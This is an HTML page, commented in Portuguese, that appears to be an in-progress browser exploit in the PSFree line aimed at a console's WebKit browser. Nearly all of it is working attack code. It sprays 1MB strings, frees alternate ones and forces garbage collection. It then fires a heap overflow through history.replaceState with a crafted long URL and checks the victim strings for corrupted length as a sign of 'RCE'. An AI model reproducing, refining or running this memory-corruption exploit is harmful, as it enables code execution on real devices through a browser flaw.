<!DOCTYPE html>
<html>
<head>
    <title>Long-Range PSFree (1MB)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        .danger { border-color: red; color: red; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Long-Range PSFree (1MB)</h1>
    <p>Usando o alcance confirmado (+339KB) para buscar vítimas de 1MB.</p>

    <button onclick="runAttack(1024 * 16)">1. Alcance Curto (+16KB)</button>
    <button onclick="runAttack(1024 * 128)">2. Alcance Médio (+128KB)</button>
    <button onclick="runAttack(1024 * 339)">3. Alcance Máximo (+339KB)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Offset Base Fixo (Dados)
        const BASE_OFFSET = 709520; 

        // Vítima: 1MB (Alinhamento Large Heap)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runAttack(overflowAmount) {
            log(`--- TESTANDO ALCANCE: ${overflowAmount / 1024} KB ---`);
            
            // 1. SPRAY (1MB TextDecoder - O Vencedor)
            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
            rawBuffer.fill(0x42); // 'B'
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            victims = [];
            // Menos vítimas, pois são gigantes
            const SPRAY_COUNT = 60; 

            log("Alocando vítimas...");
            for(let i=0; i<SPRAY_COUNT; i++) {
                let s = i + "_" + baseString.substring((i+"_").length);
                victims.push(s);
            }

            // 2. BURACOS
            log("Criando buracos...");
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null;
            }

            await forceGC();

            // 3. EXPLOIT
            log("Disparando Overflow...");
            setTimeout(() => {
                try {
                    // Base
                    let buffer = "A".repeat(BASE_OFFSET);
                    // Extensão variável (baseada no botão clicado)
                    buffer += "\x01".repeat(overflowAmount);
                    
                    // Gatilho de Crash no final (para garantir que o sistema processe tudo)
                    // Se o alcance for curto, o 'AAAA' no final ajuda a alinhar o fim do bloco
                    buffer += "AAAA"; 

                    history.replaceState({}, "long_range", "/" + buffer);

                    log("Verificando...");
                    checkVictims(PAYLOAD_SIZE);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkVictims(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO 1: LENGTH
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido na Vítima ${i}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO 2: DADOS
                    if (msg.charCodeAt(0) !== 66) {
                        log(`[SUCESSO PARCIAL] Dados atingidos na Vítima ${i}.`, 'win');
                        log(`Dica: O alcance foi suficiente para tocar o corpo. Tente ajustar o spray.`);
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido. Tente aumentar o alcance.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
